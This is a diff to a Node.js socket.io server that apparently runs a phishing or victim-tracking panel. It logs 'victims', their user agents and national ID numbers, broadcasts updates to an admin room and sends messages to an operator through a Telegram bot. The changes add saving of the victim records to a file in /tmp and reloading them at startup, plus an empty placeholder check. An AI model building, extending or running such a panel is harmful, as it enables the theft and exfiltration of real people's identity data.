@@ -5,8 +5,11 @@ const http = require('http');
 const socketIo = require('socket.io');
 const fetch = require('node-fetch');
 const url = require('url');
+const fs = require('fs');
+const path = require('path');
 
 const PORT = process.env.PORT || 3001;
+const DATA_FILE = path.join('/tmp', 'victims.json');
 
 // Config (can be updated via admin panel)
 let config = {
@@ -122,6 +125,7 @@ const server = http.createServer((req, res) => {
 
         // Broadcast update to all admins
         io.to('admins').emit('victims_update', Object.values(victims));
+        saveVictims();
 
         // Send Telegram if message provided
         if (telegramMsg) await sendTelegram(telegramMsg);
@@ -160,8 +164,32 @@ const io = socketIo(server, {
   allowEIO3: true
 });
 
-// In-memory storage
-let victims = {};
+// Persistent storage - load from file on startup
+function loadVictims() {
+  try {
+    if (fs.existsSync(DATA_FILE)) {
+      const raw = fs.readFileSync(DATA_FILE, 'utf8');
+      const loaded = JSON.parse(raw);
+      // Mark all as offline since server just started
+      Object.values(loaded).forEach(v => { v.status = 'offline'; });
+      console.log(`Loaded ${Object.keys(loaded).length} victims from disk`);
+      return loaded;
+    }
+  } catch (e) {
+    console.error('Failed to load victims from disk:', e);
+  }
+  return {};
+}
+
+function saveVictims() {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(victims), 'utf8');
+  } catch (e) {
+    console.error('Failed to save victims to disk:', e);
+  }
+}
+
+let victims = loadVictims();
 
 async function sendTelegram(message) {
   if (!config.botToken || !config.chatId) {
@@ -215,10 +243,14 @@ io.on('connection', (socket) => {
     victims[vId].lastSeen = new Date();
     victims[vId].socketId = socket.id;
     victims[vId].userAgent = socket.handshake.headers['user-agent'];
+    if (data.info && data.info.nik && !victims[vId].data.niks.find(n => n.value === data.info.nik)) {
+      // don't add nik here, it comes via /victim-data
+    }
     socket.vId = vId;
     socket.join(vId);
 
     io.to('admins').emit('victims_update', Object.values(victims));
+    saveVictims();
     console.log('Victim joined:', vId);
   });
 
@@ -236,6 +268,7 @@ io.on('connection', (socket) => {
       victims[socket.vId].status = 'offline';
       victims[socket.vId].lastSeen = new Date();
       io.to('admins').emit('victims_update', Object.values(victims));
+      saveVictims();
       console.log('Victim disconnected:', socket.vId);
     }
   });
